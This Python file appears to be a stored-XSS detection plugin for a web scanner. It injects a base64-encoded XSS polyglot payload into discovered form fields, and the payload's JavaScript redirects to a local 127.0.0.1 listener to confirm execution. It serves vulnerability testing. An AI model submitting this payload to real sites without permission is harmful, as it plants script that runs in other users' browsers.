# coding:utf-8

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import threading
import time
import base64
import html

from lib.exceptions import NoRequestsException
from lib.utils.random import randstr

import requests
from selenium import webdriver
from browsermobproxy import Server

xss_payload = [
    'amFWYXNDcmlwdDovKi0vKmAvKlxgLyonLyoiLyoqLygvKiAqL29OY2xpQ2s9',
    'ICkvLyUwRCUwQSUwZCUwYS8vPC9zdFlsZS88L3RpdExlLzwvdGVYdGFyRWEvPC9zY1JpcHQvLS0hPlx4M2NzVmcvPHNWZy9vTmxvQWQ9',
    'Ly8+XHgzZQ=='
]
script_template = "window.location.href='http://127.0.0.1:{}?uuid={}&name={}&url='+window.location.href"


class StoredXSSDetector:
    def __init__(self, results, reports, **kwargs):
        self.results = results
        self.reports = reports
        self.args = kwargs
        self.factor_length = 6
        self.factor = randstr(self.factor_length)
        self.rand_length = 10
        self.listen_port = 9759
        self.filled_forms = {}
        self.str_mapping = {}
        self.bindings = {}
        self.lock = threading.Lock()
        self.vulnerable = []
        self.server = None
        self.cookies = {}
        for entry in self.args['cookie'].split(';'):
            if entry.find('=') == -1:
                continue
            key, value = entry.strip().split('=', 1)
            self.cookies[key] = value
        # Create proxy server
        self.proxy_server = Server(self.args['browsermobproxy'])
        self.proxy_server.start()
        self.proxy = self.proxy_server.create_proxy()
        # Create Chrome engine
        self.chrome_options = webdriver.ChromeOptions()
        self.chrome_options.add_argument('--proxy-server={}'.format(self.proxy.proxy))
        if 'headless' in self.args:
            self.chrome_options.add_argument('--headless')
        self.chrome_options.add_argument('--disable-gpu')
        self.chrome_options.add_argument("--disable-extensions")
        self.driver = webdriver.Chrome(chrome_options=self.chrome_options)

    @staticmethod
    def meta():
        return {
            'name': 'Stored XSS Detector for all',
            'version': '1.0'
        }

    def random_form(self):
        for uuid in self.results['requests']:
            request = self.results['requests'][uuid]
            if request['content-type'] == 'text/plain':
                continue
            params = {}
            self.filled_forms[request['uuid']] = {}
            r = None
            for name in request['fields']:
                field = request['fields'][name]
                if field['type'] in ['text', 'password', 'textarea']:
                    params[name] = self.factor + randstr(self.rand_length)
                    self.filled_forms[request['uuid']][name] = params[name]
                    self.str_mapping[params[name]] = (request['uuid'], name)
                elif field['type'] == 'radio':
                    params[name] = field['values'][0]
                elif field['type'] == 'checkbox':
                    params[name] = field['value']
                else:
                    params[name] = field['default']
            if request['method'] == 'GET':
                r = requests.get(request['url'], params=params, cookies=self.cookies)
            elif request['method'] == 'POST':
                if request['content-type'] == 'application/x-www-form-urlencoded':
                    r = requests.post(request['url'], data=params, cookies=self.cookies)
                elif request['content-type'] == 'multipart/form-data':
                    r = requests.post(request['url'], files=params, cookies=self.cookies)
            if r.status_code not in [200, 301, 302, 306, 307, 308]:
                del self.filled_forms[request['uuid']]

    def bind_form(self):
        for url in self.results['urls']:
            r = requests.get(url, cookies=self.cookies)
            text = r.text
            pos = text.find(self.factor)
            while pos != -1:
                rand = text[pos:pos + self.factor_length + self.rand_length]
                if rand in self.str_mapping:
                    self.bindings[self.str_mapping[rand]] = url
                pos = text.find(self.factor, pos + self.factor_length + self.rand_length)

    def start_server(self):
        class Handler(BaseHTTPRequestHandler):
            def do_GET(s):
                query = parse_qs(urlparse(s.path).query)
                if 'uuid' in query and 'name' in query:
                    self.lock.acquire()
                    try:
                        pair = (query['uuid'][0], query['name'][0], query['url'][0])
                        if pair not in self.vulnerable:
                            self.vulnerable.append(pair)
                    finally:
                        self.lock.release()
                s.send_response(200)
                s.send_header('Content-Type', 'text/html')
                s.end_headers()
                s.wfile.write(b'')

        def start_server():
            print('Starting listening server at port {}'.format(self.listen_port))
            self.server.serve_forever()

        self.server = HTTPServer(('127.0.0.1', self.listen_port), Handler)
        t = threading.Thread(target=start_server, daemon=True)
        t.start()
        time.sleep(3)

    def send_payload(self):
        for info in self.bindings:
            url = self.bindings[info]
            request = self.results['requests'][info[0]]
            params = {}
            for name in request['fields']:
                field = request['fields'][name]
                if name == info[1]:
                    script = script_template.format(self.listen_port, info[0], info[1])
                    params[name] = \
                        base64.b64decode(xss_payload[0]).decode('utf-8') + script + \
                        base64.b64decode(xss_payload[1]).decode('utf-8') + script + \
                        base64.b64decode(xss_payload[2]).decode('utf-8')
                elif field['type'] == 'radio':
                    params[name] = field['values'][0]
                elif field['type'] == 'checkbox':
                    params[name] = field['value']
                else:
                    params[name] = field['default']
            r = None
            if request['method'] == 'GET':
                r = requests.get(request['url'], params=params, cookies=self.cookies)
            elif request['method'] == 'POST':
                if request['content-type'] == 'application/x-www-form-urlencoded':
                    r = requests.post(request['url'], data=params, cookies=self.cookies)
                elif request['content-type'] == 'multipart/form-data':
                    r = requests.post(request['url'], files=params, cookies=self.cookies)
            if r.status_code not in [200, 301, 302, 306, 307, 308]:
                continue
            self.driver.get(url)
            for key in self.cookies:
                exist = self.driver.get_cookie(key)
                if exist is not None and exist['value'] != self.cookies[key]:
                    self.driver.add_cookie({
                        'name': key,
                        'value': self.cookies[key]
                    })
            self.driver.get(url)

    def stop_server(self):
        self.server.shutdown()
        print('The server has been closed')

    def make_report(self):
        def make_entry(v):
            request = self.results['requests'][v[0]]
            return [request['location'], request['url'], request['method'], v[1], html.escape(v[2])]

        self.reports.append({
            'title': 'Stored XSS Injection Points',
            'overview': 'Found {} Stored XSS injection point(s)'.format(len(self.vulnerable)),
            'header': ['Form Location', 'Target', 'Method', 'Name', 'XSS Location'],
            'entries': list(map(make_entry, self.vulnerable))
        })

    def exec(self):
        if 'requests' not in self.results:
            raise NoRequestsException
        self.random_form()
        self.bind_form()
        self.start_server()
        self.send_payload()
        self.stop_server()
        self.make_report()
        self.proxy.close()
        self.proxy_server.stop()
        self.driver.stop_client()
        self.driver.close()
